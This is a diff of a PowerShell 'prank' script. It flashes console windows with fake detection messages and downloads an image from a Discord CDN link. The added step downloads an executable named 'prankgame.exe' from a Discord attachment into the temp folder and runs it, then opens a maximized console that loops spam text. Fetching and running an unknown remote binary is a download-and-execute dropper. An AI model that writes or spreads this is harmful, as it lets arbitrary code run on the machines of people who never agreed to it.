@@ -1890,27 +1890,32 @@
 # This is a comment
 
 # Step 1: Show text in CMD with colors
-Start-Process cmd -ArgumentList '/c color 0a && echo AD72 ACTIVATED && echo OBJET DETECTE : WINDOWS 11 && timeout /t 5'
+# Step 1: Open CMD with colored messages (auto closes after 5s, no "press key")
+Start-Process cmd -ArgumentList '/c color 0a && echo AD72 ACTIVATED && echo OBJET DETECTE : WINDOWS 11 && ping 127.0.0.1 -n 6 >nul'
 
 Start-Sleep -Seconds 6
 
-# Step 2: Open 10 quick cmd flashes (close after 0.5s)
+# Step 2: Flash 10 quick CMD windows (0.5s each)
 for ($i = 1; $i -le 10; $i++) {
-    Start-Process cmd -ArgumentList '/c echo Flash $i && timeout /t 1 >nul'
+    Start-Process cmd -ArgumentList '/c echo Flash $i && ping 127.0.0.1 -n 2 >nul'
     Start-Sleep -Milliseconds 500
 }
 
-# Step 3: Download the PNG
+# Step 3: Download and show PNG
 $imgPath = "$env:TEMP\testimage.png"
 Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1106537994061619240/1412150919801471046/pIUk6nh.png?ex=68b73f87&is=68b5ee07&hm=3cac4cac67cccc4e22cb1848c3f0d1202e7582f75fc69c90e6ad06317ecb1565&" -OutFile $imgPath
-
-# Step 4: Open the image (you can press F11 to fullscreen in Photos)
 Start-Process $imgPath
 
 Start-Sleep -Seconds 3
 
-# Step 5: Fullscreen cmd spamming text (stop with Ctrl+C)
-Start-Process cmd -ArgumentList '/k mode con: cols=200 lines=60 && :loop && echo this was a test && goto loop'
+# Step 4: Download prank EXE and execute it
+$exePath = "$env:TEMP\prankgame.exe"
+Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1106537994061619240/1412152837483528295/dxqvIvN.exe?ex=68b74150&is=68b5efd0&hm=33172d990b02a1eb9a8dd0df01fbc9e485e7a0365720e30542d71d71dca8b158&" -OutFile $exePath
+Start-Process $exePath
+
+# Step 5: Open fullscreen CMD that spams text until user closes
+Start-Process cmd -ArgumentList '/k mode con: cols=200 lines=60 && :loop && echo this was a test && goto loop' -WindowStyle Maximized
+
 
 # This is a comment
 # This is a comment
